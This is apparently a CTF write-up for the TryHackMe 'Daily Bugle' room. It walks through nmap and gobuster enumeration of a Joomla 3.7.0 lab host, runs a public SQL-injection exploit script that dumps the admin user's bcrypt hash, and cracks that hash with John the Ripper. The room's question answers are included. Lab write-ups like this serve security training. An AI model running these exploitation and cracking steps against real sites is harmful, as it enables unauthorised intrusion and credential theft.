# Daily Bugle - Tryhackme

<img width="722" height="166" alt="Image" src="https://github.com/user-attachments/assets/c5d47337-5206-4737-a93c-00a392af50ad" />

This room demonstrates how SQL injection in a Joomla CMS can be exploited to compromise user accounts, crack password hashes, and escalate privileges through misconfigured system utilities.

## INFO'S
* Difficulty: Hard
* Operating System : Linux
* Attack Type : Web application exploitation (SQLi) + credential compromise + privilege escalation.

## Enumeration
### Nmap Scan
```
Nmap scan report for 10.66.183.12
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

```
The Nmap Scan shows the ports are opened are ssh(22) , http(80) , mysql(3306).

## Web Enumration (PORT 80)

<img width="1680" height="972" alt="Image" src="https://github.com/user-attachments/assets/24e9320b-948f-4cca-a056-5f1fe0406c75" />

Question 1. Access the web server, who robbed the bank?

Answer : spiderman

Explore The website source code and functionality were reviewed to understand the application workflow, followed by directory enumeration.

## Gobuster Scan

```
Command : gobuster dir -u http://<ip_address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/README.txt           (Status: 200) [Size: 40] [--> http://10.66.183.12/README.txt/]
/images               (Status: 301) [Size: 235] [--> http://10.66.183.12/images/]
/media                (Status: 301) [Size: 234] [--> http://10.66.183.12/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.66.183.12/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.66.183.12/modules/]
/bin                  (Status: 301) [Size: 232] [--> http://10.66.183.12/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.66.183.12/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.66.183.12/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.66.183.12/language/]
/components           (Status: 301) [Size: 239] [--> http://10.66.183.12/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.66.183.12/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.66.183.12/libraries/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.66.183.12/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.66.183.12/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.66.183.12/administrator/]
/cli                  (Status: 301) [Size: 232] [--> http://10.66.183.12/cli/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================

```
Intresting Directory ```/README.txt``` has been found.
```
1- What is this?
        * This is a Joomla! installation/upgrade package to version 3.x
        * Joomla! Official site: https://www.joomla.org
        * Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
        * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

2- What is Joomla?
        * Joomla! is a Content Management System (CMS) which enables you to build Web sites and powerful online applications.
        * It's a free and Open Source software, distributed under the GNU General Public License version 2 or later.
        * This is a simple and powerful web server application and it requires a server with PHP and either MySQL, PostgreSQL or SQL Server to run.
        You can find full technical requirements here: https://downloads.joomla.org/technical-requirements.

3- Is Joomla! for you?
        * Joomla! is the right solution for most content web projects: https://docs.joomla.org/Portal:Learn_More
        * See Joomla's core features - https://www.joomla.org/core-features.html
        * Try out our online demo: https://demo.joomla.org/

4- How to find a Joomla! translation?
        * Repository of accredited language packs: https://community.joomla.org/translations.html
        * You can also add languages directly to your website via your Joomla! administration panel: https://docs.joomla.org/J3.x:Setup_a_Multilingual_Site/Installing_New_Language
        * Learn how to setup a Multilingual Joomla! Site: https://docs.joomla.org/J3.x:Setup_a_Multilingual_Site

5- Learn Joomla!
        * Read Getting Started with Joomla to find out the basics: https://docs.joomla.org/J3.x:Getting_Started_with_Joomla!
        * Before installing, read the beginners guide: https://docs.joomla.org/Portal:Beginners

  ...........
```
Question 2. What is the Joomla version?

Answer : 3.7.0

The readme.txt has the version ```Joomla! 3.7 version```


Another Interesting Directory ```/administrator``` has been found .

<img width="1680" height="976" alt="Image" src="https://github.com/user-attachments/assets/2343e3e1-67b4-4a2f-847e-064c9c157e89" />

Now we know the Joomala CMS 3.7.0 running so seach the exploit in the Google as we find the exploit in the [ExploitDB](https://www.exploit-db.com/exploits/42033)
but author what us to try another method of python script so after a long search finally found the exploit of it in the github (https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) Thanks @stefanlucas

the exploit is the joomblah we run it ...

```
python3 joomblah.py http://<ip_addresss>
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
                                               
```
In the Sql database we got the Credentials from the Table of the user ```jonah``` and the password hash of it .

Save the hash and use the ```John the Ripper``` tool for brute force attack

```
john --wordlist=/usr/share/wordlists/rockyou.txt <hash_file>

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:07:47 DONE (2026-01-02 20:12) 0.002138g/s 100.1p/s 100.1c/s 100.1C/s thelma1..speciala
Session completed. 
```

the Password Cracked ```jonah``` : ```spiderman123```
